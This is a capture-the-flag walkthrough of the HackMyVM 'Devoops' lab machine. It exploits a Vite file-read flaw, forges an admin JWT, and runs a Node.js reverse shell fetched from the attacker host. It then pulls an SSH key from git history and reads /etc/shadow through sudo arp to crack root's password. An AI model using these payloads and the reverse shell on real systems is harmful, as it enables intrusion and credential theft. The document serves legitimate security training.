# Devoops

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Devoops | 20206675 | Beginner | HackMyVM |

**Summary:** Devoops is a beginner-level Linux machine that demonstrates a modern web application vulnerability chain. The machine hosts a Vue.js development server with a Vite 6.2.0 backend that suffers from CVE-2025-30208 (Vite Arbitrary File Read). Through this vulnerability, we can access sensitive configuration files including JWT secrets and server source code. The application provides an authenticated command execution endpoint that can be bypassed by forging a JWT token with admin privileges. After gaining initial access as the 'runner' user, privilege escalation is achieved by discovering SSH private keys in Git repositories and ultimately cracking the root user's password hash using sudo file read capabilities.

---

## Reconnaissance

### Network Discovery
Initial network scanning reveals the target machine at IP 192.168.100.35:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
...
[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.35 08:00:27:B1:20:4B VirtualBox
```

### Port Scanning
A comprehensive port scan reveals a single open service:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops]
└─$ nmap -sCV -p- 192.168.100.35
...
PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, NCP, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest:
|     HTTP/1.1 403 Forbidden
|     Vary: Origin
|     Content-Type: text/plain
|     Date: Mon, 26 Jan 2026 00:15:14 GMT
|     Connection: close
|     Blocked request. This host (undefined) is not allowed.
|     allow this host, add undefined to `server.allowedHosts` in vite.config.js.
|   GetRequest:
|     HTTP/1.1 403 Forbidden
|     Vary: Origin
|     Content-Type: text/plain
|     Date: Mon, 26 Jan 2026 00:15:10 GMT
|     Connection: close
|     Blocked request. This host (undefined) is not allowed.
|     allow this host, add undefined to `server.allowedHosts` in vite.config.js.
```

### Web Application Analysis
Accessing http://192.168.100.35:3000/ reveals a Vue.js + Express.js development environment:

![](image.png)

The application's source code shows it's running Vite 6.2.0:

```javascript
<!doctype html>
<html lang="en">
  <head>
    <script type="module" src="/@vite/client"></script>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Vite + Vue</title>
  </head>
  <body>
    <div id="app"></div>
    <script type="module" src="/src/main.js"></script>
  </body>
</html>
```

Examining the Vite client endpoint reveals the specific version:

```
import "/node_modules/.pnpm/vite@6.2.0/node_modules/vite/dist/client/env.mjs";
```

This version is vulnerable to CVE-2025-30208 (Vite Arbitrary File Read Vulnerability).

---

## Vulnerability Discovery

### CVE-2025-30208 Exploitation Setup
Setting up the CVE-2025-30208 exploit:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops]
└─$ git clone https://github.com/ThemeHackers/CVE-2025-30208.git

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops/CVE-2025-30208]
└─$ python3 -m venv venv

┌──(venv)─(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops/CVE-2025-30208]
└─$ source venv/bin/activate

┌──(venv)─(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops/CVE-2025-30208]
└─$ pip install -r requirements.txt
```

### Vulnerability Scanning
Running the CVE-2025-30208 scanner confirms multiple vulnerable endpoints:

```bash
CVE-2025-30208 > set RHOST 192.168.100.35
RHOST => 192.168.100.35
CVE-2025-30208 > set RPORT 3000
RPORT => 3000
CVE-2025-30208 > exploit
...
Scan Results for 192.168.100.35:3000:
╒═══════════════════════════════════╤═════════════════════════════════════════════════════════════╤════════════════╕
│ Payload                           │ URL                                                         │ Result         │
╞═══════════════════════════════════╪═════════════════════════════════════════════════════════════╪════════════════╡
│ /@fs/etc/passwd?raw??             │ http://192.168.100.35:3000/@fs/etc/passwd?raw??             │ VULNERABLE     │
│ /@fs/etc/passwd?import&raw??      │ http://192.168.100.35:3000/@fs/etc/passwd?import&raw??      │ VULNERABLE     │
│ /app/etc/passwd?raw&url           │ http://192.168.100.35:3000/app/etc/passwd?raw&url           │ VULNERABLE     │
│ /App/etc/passwd?raw&url           │ http://192.168.100.35:3000/App/etc/passwd?raw&url           │ VULNERABLE     │
╘═══════════════════════════════════╧═════════════════════════════════════════════════════════════╧════════════════╛
...
```

### System Information Gathering
Using the file read vulnerability to gather system information:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops/CVE-2025-30208]
└─$ curl http://192.168.100.35:3000/@fs/etc/passwd?raw??
export default "root:x:0:0:root:/root:/bin/sh\n...
runner:x:1000:1000:::/bin/sh\n
hana:x:1001:100::/home/hana:/bin/sh\n
gitea:x:102:82:gitea:/var/lib/gitea:/bin/sh\n"
```

Extracting environment variables reveals the application structure:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops/CVE-2025-30208]
└─$ curl http://192.168.100.35:3000/@fs/proc/self/environ?raw??
export default "...USER=runner...PWD=/opt/node...npm_package_name=devoops..."
```

Key findings:
- Running user: `runner`
- Working directory: `/opt/node`  
- Application name: `devoops`

### Application Configuration Analysis
Discovering sensitive configuration files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops/CVE-2025-30208]
└─$ curl http://192.168.100.35:3000/@fs/opt/node/.env?raw??
export default "JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd'\n"
```

Critical findings:
- JWT secret: `2942szKG7Ev83aDviugAa6rFpKixZzZz`
- Command filtering is implemented

Reading the main server code:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops]
└─$ curl -s "http://192.168.100.35:3000/@fs/opt/node/server.js?raw??" | node -e "const fs = require('fs'); const input = fs.readFileSync(0, 'utf8'); try { const code = eval(input.replace('export default', '')); console.log(code); } catch(e) { console.log(input) }"
import express from 'express';
import jwt from 'jsonwebtoken';
import 'dotenv/config'
import { exec } from 'child_process';
import { promisify } from 'util';

const app = express();

const address = 'localhost';
const port = 3001;

const exec_promise = promisify(exec);

const COMMAND_FILTER = process.env.COMMAND_FILTER
    ? process.env.COMMAND_FILTER.split(',')
        .map(cmd => cmd.trim().toLowerCase())
        .filter(cmd => cmd !== '')
    : [];

app.use(express.json());

function is_safe_command(cmd) {
    if (!cmd || typeof cmd !== 'string') {
        return false;
    }
    if (COMMAND_FILTER.length === 0) {
        return false;
    }

    const lower_cmd = cmd.toLowerCase();

    for (const forbidden of COMMAND_FILTER) {
        const regex = new RegExp(`\\b${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b|^${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i');
        if (regex.test(lower_cmd)) {
            return false;
        }
    }

    if (/[;&|]/.test(cmd)) {
        return false;
    }
    if (/[<>]/.test(cmd)) {
        return false;
    }
    if (/[`$()]/.test(cmd)) {
        return false;
    }

    return true;
}

async function execute_command_sync(command) {
    try {
        const { stdout, stderr } = await exec_promise(command);

        if (stderr) {
            return { status: false, data: { stdout, stderr } };
        }
        return { status: true, data: { stdout, stderr } };
    } catch (error) {
        return { status: true, data: error.message };
    }
}

app.get('/', (req, res) => {
    return res.json({
        'status': 'working',
        'data': `listening on http://${address}:${port}`
    })
})

app.get('/api/sign', (req, res) => {
    return res.json({
        'status': 'signed',
        'data': jwt.sign({
            uid: -1,
            role: 'guest',
        }, process.env.JWT_SECRET, { expiresIn: '1800s' }),
    });
});

app.get('/api/execute', async (req, res) => {
    const authorization_header_raw = req.headers['authorization'];
    if (!authorization_header_raw || !authorization_header_raw.startsWith('Bearer ')) {
        return res.status(401).json({
            'status': 'rejected',
            'data': 'permission denied'
        });
    }

    const jwt_raw = authorization_header_raw.split(' ')[1];

    try {
        const payload = jwt.verify(jwt_raw, process.env.JWT_SECRET);
        if (payload.role !== 'admin') {
            return res.status(403).json({
                'status': 'rejected',
                'data': 'permission denied'
            });
        }
    } catch (err) {
        return res.status(401).json({
            'status': 'rejected',
            'data': `permission denied`
        });
    }

    const command = req.query.cmd;

    const is_command_safe = is_safe_command(command);
    if (!is_command_safe) {
        return res.status(401).json({
            'status': 'rejected',
            'data': `this command is unsafe`
        });
    }

    const result = await execute_command_sync(command);

    return res.json({
        'status': result.status === true ? 'executed' : 'failed',
        'data': result.data
    })
});

app.listen(port, address, () => {
    console.log(`Listening on http://${address}:${port}`)
});
```

The server.js reveals:
- Express.js server running on localhost:3001
- JWT authentication for `/api/execute` endpoint
- Command execution functionality with safety filtering
- Admin role required for command execution

The Vite configuration shows proxy rules:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops]
└─$ curl -s "http://192.168.100.35:3000/@fs/opt/node/vite.config.js?raw??" | node -e "const fs = require('fs'); const input = fs.readFileSync(0, 'utf8'); try { const code = eval(input.replace('export default', '')); console.log(code); } catch(e) { console.log(input) }"
import { defineConfig } from 'vite'
import vue from '@vitejs/plugin-vue'

// https://vite.dev/config/
export default defineConfig({
  plugins: [vue()],
  server: {
    proxy: {
      '/sign': {
        target: 'http://localhost:3001',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/sign/, '/api/sign')
      },
      '/execute': {
        target: 'http://localhost:3001',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/execute/, '/api/execute')
      }
    },
    fs: {
      deny: ['.env', '.env.*', '*.{crt,pem}', '**/.git/**', 'package.json'],
    }
  },
})
```

This confirms that requests to `/execute` are proxied to `localhost:3001/api/execute`.

---

## Initial Access

### JWT Token Forgery
Using the discovered JWT secret to create an admin token:

![](image-1.png)

The forged JWT token with admin privileges:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiJ9.Cwv1jwYldeefgzLBE2UUHph-RAHVtgNohq-efC_NyXY
```

### Command Execution Testing
Testing the forged JWT with command execution:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops]
└─$ curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiJ9.Cwv1jwYldeefgzLBE2UUHph-RAHVtgNohq-efC_NyXY" "http://192.168.100.35:3000/execute?cmd=id"
{"status":"executed","data":{"stdout":"uid=1000(runner) gid=1000(runner) groups=1000(runner)\n","stderr":""}}
```

Success! The JWT forgery bypasses authentication and allows command execution as the `runner` user.

### Reverse Shell Payload
Due to command filtering, we need to upload and execute a Node.js reverse shell:

```javascript
// shell.js
const net = require('net');
const { spawn } = require('child_process');
const ip = "192.168.100.1";
const port = 4444;

const client = new net.Socket();
client.connect(port, ip, () => {
    const sh = spawn('/bin/sh', []);
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});
```

Setting up HTTP server to serve the payload:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.21.32.1 - - [26/Jan/2026 08:09:17] "GET /shell.js HTTP/1.1" 200 -
```

Uploading the shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops]
└─$ curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiJ9.Cwv1jwYldeefgzLBE2UUHph-RAHVtgNohq-efC_NyXY" "http://192.168.100.35:3000/execute?cmd=wget+http://192.168.100.1/shell.js+-O+/tmp/shell.js"
{"status":"failed","data":{"stdout":"","stderr":"Connecting to 192.168.100.1 (192.168.100.1:80)\nsaving to '/tmp/shell.js'\nshell.js             100% |********************************|   322  0:00:00 ETA\n'/tmp/shell.js' saved\n"}} 
```

### Initial Shell Access
Setting up netcat listener and triggering the reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

In another terminal: 

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops]
└─$ curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiJ9.Cwv1jwYldeefgzLBE2UUHph-RAHVtgNohq-efC_NyXY" "http://192.168.100.35:3000/execute?cmd=node+/tmp/shell.js"
```

Successfully obtained initial access:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 62247
id
uid=1000(runner) gid=1000(runner) groups=1000(runner)
/bin/sh -i
/bin/sh: can't access tty; job control turned off
/opt/node $
```

---

## Internal Enumeration

### File System Exploration
Exploring the system structure:

```bash
/opt/node $ cd ..
/opt $ ls -la
total 16
drwxr-xr-x    4 root     root          4096 Apr 21  2025 .
drwxr-xr-x   21 root     root          4096 Apr 21  2025 ..
drwxr-xr-x    5 gitea    root          4096 Apr 21  2025 gitea
drwxrwx---    6 root     runner        4096 Apr 21  2025 node
```

### Git Repository Discovery  
Investigating the Gitea installation:

```bash
/opt $ cd gitea
/opt/gitea $ ls -la
total 20
drwxr-xr-x    5 gitea    root          4096 Apr 21  2025 .
drwxr-xr-x    4 root     root          4096 Apr 21  2025 ..
drwxr-xr-x    2 gitea    www-data      4096 Apr 21  2025 db
drwxr-xr-x    3 gitea    www-data      4096 Apr 21  2025 git
drwxr-xr-x    2 gitea    www-data      4096 Apr 21  2025 log

/opt/gitea/git $ ls
hana
/opt/gitea/git $ cd hana
/opt/gitea/git/hana $ ls -la
total 12
drwxr-xr-x    3 gitea    www-data      4096 Apr 21  2025 .
drwxr-xr-x    3 gitea    www-data      4096 Apr 21  2025 ..
drwxr-xr-x    8 gitea    www-data      4096 Apr 21  2025 node.git
```

### Git History Analysis
Examining commit history in the Gitea database:

```bash
/opt/gitea/git/hana/node.git $ strings /opt/gitea/db/gitea.db | grep -A 5 "hana"
...
refs/heads/main{"Commits":[{"Sha1":"1994a70bbd080c633ac85a339fd85a8635c63893","Message":"del: oops!\n"...
refs/heads/main{"Commits":[{"Sha1":"02c0f912f6e5b09616580d960f3e5ee33b06084a","Message":"init: init commit\n"...
...
```

Found two commits:
1. Initial commit: `02c0f912f6e5b09616580d960f3e5ee33b06084a`
2. Deletion commit: `1994a70bbd080c633ac85a339fd85a8635c63893`

### SSH Key Discovery
Examining the initial commit reveals sensitive information:

```bash
/opt/gitea/git/hana/node.git $ git -c safe.directory='*' show 02c0f912f6e5b09616580d960f3e5ee33b06084a | grep -iE "pass|pwd|secret|key|token"
+JWT_SECRET='2942szKG7Ev83aDviugAa6rF'
+-----BEGIN OPENSSH PRIVATE KEY-----
+-----END OPENSSH PRIVATE KEY-----
...
```

Extracting the SSH private key:

```bash
/opt/gitea/git/hana/node.git $ git -c safe.directory='*' show 02c0f912f6e5b09616580d960f3e5ee33b06084a | sed -n '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p' | sed 's/^+//' > /tmp/id_rsa
/opt/gitea/git/hana/node.git $ cat /tmp/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

---

### Lateral Movement to hana User
Using the discovered SSH key to access the `hana` user account:

```bash
/opt/gitea/git/hana/node.git $ chmod 600 /tmp/id_rsa
/opt/gitea/git/hana/node.git $ ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no hana@localhost
Could not create directory '/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/.ssh/known_hosts).
id
uid=1001(hana) gid=100(users) groups=100(users),100(users)
```

Successfully accessed the `hana` user account and found the user flag:

```bash
/bin/sh -i
/bin/sh: can't access tty; job control turned off
~ $ ls -la
total 16
drwx------    3 hana     users         4096 Apr 21  2025 .
drwxr-xr-x    3 root     root          4096 Apr 21  2025 ..
lrwxrwxrwx    1 root     users            9 Apr 21  2025 .ash_history -> /dev/null
drwx------    2 hana     users         4096 Apr 21  2025 .ssh
-r--------    1 hana     users           39 Apr 21  2025 user.flag
```

## Privilege Escalation

### Sudo Privileges Analysis
Checking sudo capabilities:

```bash
~ $ sudo -l
Matching Defaults entries for hana on devoops:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for hana:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User hana may run the following commands on devoops:
    (root) NOPASSWD: /sbin/arp
```

### File Read via arp Command
Using the `arp` command's file read capability (GTFOBins) to access `/etc/shadow`:

```bash
~ $ sudo /sbin/arp -v -f /etc/shadow
>> root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
arp: format error on line 1 of etherfile /etc/shadow !
...
>> runner:$6$sAhdpizXgKayGrqM$lcoysLIY9dsxpwy6cyWHBS/pPbvG4KmlM06SSad0PIWrJcXssseL4EZxzF369gaPZvgyD5JXKHVCXfFUDjciP/:20199:0:99999:7:::
arp: format error on line 20 of etherfile /etc/shadow !
>> hana:$6$snNJGjzsPo.be3r1$V8NneKBkVIZYE6XOFTk1Bq2Trjyf5lO6uQUcWXogI3IiWDEiBDS2yEdck.hx0dIdmIIHGkJX7cfH3zXqKVXcc1:20199:0:99999:7:::
arp: format error on line 21 of etherfile /etc/shadow !
```

### Password Cracking
Extracting and cracking the root user's password hash:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops]
└─$ echo '$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.' > hash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
No password hashes left to crack (see FAQ)
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/devoops]
└─$ john --show hash
?:eris

1 password hash cracked, 0 left
```

### Root Access
Using the cracked password to escalate to root:

```bash
~ $ su root
Password: eris
id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### Flag Collection
Accessing root's home directory and retrieving the final flag:

```bash
/bin/sh -i
/bin/sh: can't access tty; job control turned off
/home/hana # cd
~ # ls
N073.7X7
R007.7x7oOoOoOoOoOoO
~ # cat R007.7x7oOoOoOoOoOoO
[REDACTED]
~ # cat N073.7X7
ssh://runner:Bo6xQ8Vrjm7rV1tii2gfRVW6T59jgGF7novHfQrkU3tzKmzVFxE7278L5raa2x9qCihrTrD6v0fu1m61ZkxJB5Gw@devoops.hmv
ssh://hana:UYi5Moj0BQw0QrGahe7i2Bs6VcyUcQMvmqDPs8aPdy8rJqBrcgPm33hbzBbY8j0og3aHN5bqAbKpze97BCLvuhgL@devoops.hmv
ssh://root:eris@devoops.hmv

gitea://hana:saki

jwt secret:
y0u_n3v3r_kn0w_1t -> BASE58 -> 2942szKG7Ev83aDviugAa6rF

user flag:
devoooooooops! -> MD5 -> [REDACTED]

root flag:
Debug the world -> d36u9_th3_w0r1d! -> MD5 -> [REDACTED]
```

---

## Attack Chain Summary

1. **Reconnaissance**: Discovered Vue.js + Express.js application running on port 3000 with Vite 6.2.0 development server
2. **Vulnerability Discovery**: Identified CVE-2025-30208 (Vite Arbitrary File Read) allowing access to system files and application source code
3. **Configuration Extraction**: Leveraged file read vulnerability to extract JWT secret, command filters, and application architecture details
4. **JWT Forgery**: Created admin-privileged JWT token using discovered secret to bypass authentication on `/api/execute` endpoint
5. **Initial Access**: Uploaded and executed Node.js reverse shell payload via authenticated command execution, gaining shell as `runner` user
6. **Internal Enumeration**: Discovered Gitea installation with accessible Git repositories containing sensitive commit history
7. **SSH Key Discovery**: Extracted SSH private key for `hana` user from Git commit history, enabling lateral movement
8. **Privilege Escalation**: Leveraged `hana` user's sudo privileges with `/sbin/arp` command to read `/etc/shadow` file
9. **Password Cracking**: Successfully cracked root user's SHA-512 password hash revealing password "eris"
10. **Root Access**: Used cracked credentials to escalate to root user and retrieve final flag
